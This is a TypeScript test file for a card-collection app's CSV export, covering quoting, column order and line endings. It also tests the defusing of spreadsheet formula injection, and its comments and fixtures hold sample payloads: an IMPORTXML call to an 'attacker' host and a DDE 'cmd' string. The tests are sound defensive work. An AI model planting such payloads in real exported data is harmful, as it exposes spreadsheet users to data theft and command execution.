/**
 * The CSV shape — shared by story 022's selection export, story 024's missing list and story 027's
 * full export.
 *
 * The escaping tests are not pedantry. Card names contain commas and apostrophes, at least one set
 * has a quote in a name, and a file that breaks on any of them produces a *silently wrong* import
 * rather than a failed one — rows shifted a column to the right parse fine and mean something else.
 */
import { describe, expect, it } from "vitest";
import { COLUMNS, escapeField, neutralise, toCsv } from "./csv";

describe("escaping", () => {
  it("leaves a plain value alone", () => {
    expect(escapeField("Atlas")).toBe("Atlas");
  });

  it("quotes a value containing a comma", () => {
    // The one that shifts every later column by one if it is missed.
    expect(escapeField("Atlas, Reborn")).toBe('"Atlas, Reborn"');
  });

  it("doubles an embedded quote", () => {
    expect(escapeField('The "Real" Atlas')).toBe('"The ""Real"" Atlas"');
  });

  it("quotes a value containing a newline", () => {
    expect(escapeField("Atlas\nReborn")).toBe('"Atlas\nReborn"');
  });

  it("renders null and undefined as empty, not as the word", () => {
    // `"None"` and `"undefined"` are the classic ones, and they import as real strings.
    expect(escapeField(null)).toBe("");
    expect(escapeField(undefined)).toBe("");
  });

  it("renders booleans as true/false rather than 1/0", () => {
    expect(escapeField(true)).toBe("true");
    expect(escapeField(false)).toBe("false");
  });

  it("renders zero as 0, not as empty", () => {
    // `if (!value)` would blank it, and a quantity column of empties is a broken import.
    expect(escapeField(0)).toBe("0");
  });
});

describe("formula injection", () => {
  /**
   * The server export defused these and this one did not, for the same data — so which export
   * button a collector pressed decided whether their own `storage_location` executed when they
   * opened the file. These mirror the five in `backend/tests/test_import_export.py`.
   *
   * The attack is on the **user**: `=IMPORTXML("http://attacker","//x")` in a cell can read the
   * rest of whatever sheet they paste it into.
   */
  it.each(["=", "+", "-", "@"])("defuses a value starting with %s", (prefix) => {
    expect(neutralise(`${prefix}1+1`)).toBe(`'${prefix}1+1`);
  });

  it("defuses formula-leading whitespace", () => {
    // A leading tab or CR is stripped by at least one of Excel/Sheets/LibreOffice before the
    // formula is parsed, so `\t=1+1` executes despite not starting with `=`.
    expect(neutralise("\t=1+1")).toBe("'\t=1+1");
    expect(neutralise("\r=1+1")).toBe("'\r=1+1");
  });

  it("leaves ordinary values untouched", () => {
    expect(neutralise("Atlas")).toBe("Atlas");
    expect(neutralise("near_mint")).toBe("near_mint");
    expect(neutralise("")).toBe("");
  });

  it("defuses through escapeField, which is what the export actually calls", () => {
    expect(escapeField("=IMPORTXML(\"http://x\",\"//y\")")).toContain("'=IMPORTXML");
  });

  it("puts the prefix inside the quotes when the value also needs quoting", () => {
    // Outside the quotes it would be a stray character in the row rather than a defusing prefix,
    // and the spreadsheet would both mis-parse the field and still execute the formula.
    expect(escapeField("=A1, B2")).toBe("\"'=A1, B2\"");
  });

  it("defuses a real exported row, not just a bare field", () => {
    // `storage_location` is user-typed free text, which is how a dangerous string gets in.
    const csv = toCsv([{ name: "Atlas", storage_location: "=cmd|'/c calc'!A1" }]);
    expect(csv).toContain("'=cmd");
  });

  it("prefixes a negative number too, and that is deliberate", () => {
    // Matches the backend byte for byte. No exported column is legitimately negative — quantity,
    // grade and max_price_cents are all non-negative — so this costs nothing, and diverging from
    // the server here would recreate the exact disagreement this defusal was added to remove.
    expect(escapeField(-5)).toBe("'-5");
  });
});

describe("toCsv", () => {
  it("writes the importer's header in the importer's order", () => {
    // The column order is the import contract. Two orders means an export you cannot re-import,
    // which kills the export-edit-import workflow all three stories exist to serve.
    const [header] = toCsv([]).split("\r\n");
    expect(header).toBe(COLUMNS.join(","));
  });

  it("writes one line per row", () => {
    const csv = toCsv([
      { set_code: "FE01", collector_number: "BS1-001", name: "Atlas", quantity: 2 },
      { set_code: "FE01", collector_number: "BS1-002", name: "Vipyro", quantity: 1 },
    ]);
    expect(csv.trimEnd().split("\r\n")).toHaveLength(3);
  });

  it("leaves an absent column empty rather than shifting the row", () => {
    const [, row] = toCsv([{ set_code: "FE01", name: "Atlas" }]).split("\r\n");
    const cells = row.split(",");
    expect(cells).toHaveLength(COLUMNS.length);
    expect(cells[0]).toBe("FE01");
    expect(cells[1]).toBe("");          // collector_number
    expect(cells[2]).toBe("Atlas");
  });

  it("uses CRLF line endings", () => {
    // RFC 4180, and Excel on Windows — the most likely destination — renders LF-only CSV as one
    // very long line.
    expect(toCsv([{ name: "Atlas" }])).toContain("\r\n");
  });

  it("ends with a newline", () => {
    expect(toCsv([{ name: "Atlas" }]).endsWith("\r\n")).toBe(true);
  });

  it("escapes inside a full row", () => {
    const csv = toCsv([{ name: 'Atlas, "Reborn"', set_code: "FE01" }]);
    expect(csv).toContain('"Atlas, ""Reborn"""');
  });
});
